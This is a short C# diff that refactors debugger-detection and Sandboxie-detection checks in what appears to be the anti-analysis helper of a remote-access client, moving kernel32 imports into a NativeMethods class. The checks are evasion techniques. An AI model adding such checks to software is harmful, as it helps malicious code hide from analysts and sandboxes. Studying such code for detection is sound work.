@@ -80,7 +80,7 @@ namespace Client.Helper
             bool isDebuggerPresent = false;
             try
             {
-                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+                NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                 return isDebuggerPresent;
             }
             catch
@@ -93,7 +93,7 @@ namespace Client.Helper
         {
             try
             {
-                if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+                if (NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                     return true;
                 else
                     return false;
@@ -105,10 +105,5 @@ namespace Client.Helper
         }
 
 
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
     }
 }
